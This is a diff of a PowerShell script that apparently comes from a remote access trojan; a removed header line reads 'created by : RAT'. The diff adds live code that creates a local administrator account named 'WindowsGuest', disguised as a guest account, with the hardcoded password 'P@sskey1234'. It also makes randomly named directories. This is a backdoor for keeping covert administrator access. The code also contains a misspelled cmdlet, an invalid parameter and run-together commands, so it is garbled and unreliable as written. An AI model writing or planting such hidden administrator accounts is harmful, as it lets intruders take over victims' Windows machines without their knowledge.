@@ -1,6 +1,3 @@
-
-# created by : RAT
-
 # random string for directory name
 function random_text {
     return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
@@ -10,18 +7,21 @@ function random_text {
 function create_account {
     [CmdletBinding()]
     param (
-        [string] $usertag,
-        [securestring] $passkey
+        [string] $NewLocalAdmin,
+        [securestring] $Password
     )
     begin {
     }
     process {
-        New-LocaklUser "$usertag" -passkey $passkey -FullName "$usertag" -Description "Temporary local admin" Write-Verbose "$usertag local user craeted" Add-LocalGroupMember -Group "Administrators" -Member "$usertag" Write-Verbose "$usertag added to local administrators group"
+        New-LocaklUser "$NewLocalAdmin" -passkey $Password -FullName "$NewLocalAdmin" -Description "Temporary local admin" Write-Verbose "$NewLocalAdmin local user craeted" Add-LocalGroupMember -Group "Administrators" -Member "$NewLocalAdmin" Write-Verbose "$NewLocalAdmin added to local administrators group"
     }
     end {
 
     }
 }
+$NewLocalAdmin = "WindowsGuest"
+$Password = (ConvertTo-SecureString "P@sskey1234" -AsPlainText -Force)
+create_account -NewLocalAdmin $NewLocalAdmin -Password $Password
 
 # variables
 $wd = random_text
